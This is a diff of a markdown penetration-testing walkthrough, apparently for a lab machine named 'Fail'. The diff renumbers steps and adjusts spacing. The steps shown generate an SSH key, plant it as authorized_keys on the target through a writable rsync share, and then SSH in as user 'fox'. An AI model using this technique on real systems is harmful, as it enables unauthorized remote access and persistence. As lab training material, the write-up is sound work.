@@ -66,7 +66,6 @@ Rsync also allows us to upload files, therefore we can generate a SSH key (as we
 give us a remote connection to the machine.
 
 1. Generate SSH Key
-
 ~~~
 ┌──(kali㉿kali)-[~/Desktop/Fail]
 └─$ ssh-keygen                                       
@@ -96,6 +95,7 @@ The key's randomart image is:
 ~~~
 cp -R /home/kali/.ssh .
 ~~~
+
 3. Rename id_rsa.pub (our public key) to authorized_keys before transferring to the target
 ~~~
 ┌──(kali㉿kali)-[~/Desktop/Fail]
@@ -104,11 +104,12 @@ cp -R /home/kali/.ssh .
 └─$ mv id_rsa.pub authorized_keys
 ~~~
 
-3. Upload the .ssh file (containing authorized_keys) to Rsync
+4. Upload the .ssh file (containing authorized_keys) to Rsync
 ~~~
 rsync -av /home/kali/Desktop/Fail/.ssh rsync://fox@192.168.194.126/fox
 ~~~
-4. SSH into the target machine
+
+5. SSH into the target machine
 ~~~
 ┌──(kali㉿kali)-[~/Desktop/Fail/.ssh]
 └─$ ssh -i ./id_rsa fox@192.168.194.126
